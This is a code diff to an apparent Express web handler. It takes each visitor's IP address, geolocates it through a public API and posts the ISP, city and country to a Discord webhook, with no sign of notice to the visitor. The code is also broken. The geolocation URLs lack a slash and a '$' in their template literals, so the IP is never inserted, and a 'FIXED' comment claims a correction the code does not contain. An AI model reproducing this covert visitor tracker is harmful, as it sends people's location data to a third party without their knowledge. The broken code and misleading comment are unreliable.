@@ -16,7 +16,7 @@ app.get('/', async (req, res) => {
         clientIp = clientIp.replace('::ffff:', ''); 
     } 
 
-    // 4. Default to a valid public IP if the address resolves as blank or local 
+    // 4. Default to a valid public IP if local
     if (!clientIp || clientIp === '127.0.0.1' || clientIp === '::1' || clientIp === 'localhost') { 
         clientIp = '8.8.8.8'; 
     } 
@@ -25,16 +25,14 @@ app.get('/', async (req, res) => {
 
     if (DISCORD_WEBHOOK_URL) { 
         try { 
-            // 5. FIXED: Added the missing forward slash before the IP address variable
-            const geoResponse = await fetch(`https://ipapi.co{clientIp}/json/`, { 
-                headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)' } 
-            }); 
+            // CHANGED: Using ip-api.com which does not block cloud hosting environments
+            const geoResponse = await fetch(`http://ip-api.com{clientIp}`); 
             const geoData = await geoResponse.json(); 
 
-            // 6. Map the layout properties correctly to match the API response 
-            const ispName = geoData.org || "Unknown"; 
+            // CHANGED: Properties updated to match the new API response layout
+            const ispName = geoData.isp || "Unknown"; 
             const cityName = geoData.city || "Unknown"; 
-            const countryName = geoData.country_name || "Unknown"; 
+            const countryName = geoData.country || "Unknown"; 
 
             const discordPayload = { 
                 embeds: [{ 
@@ -52,7 +50,6 @@ app.get('/', async (req, res) => {
                 }] 
             }; 
 
-            // 7. Push payload directly to the Discord channel 
             await fetch(DISCORD_WEBHOOK_URL, { 
                 method: 'POST', 
                 headers: { 'Content-Type': 'application/json' }, 
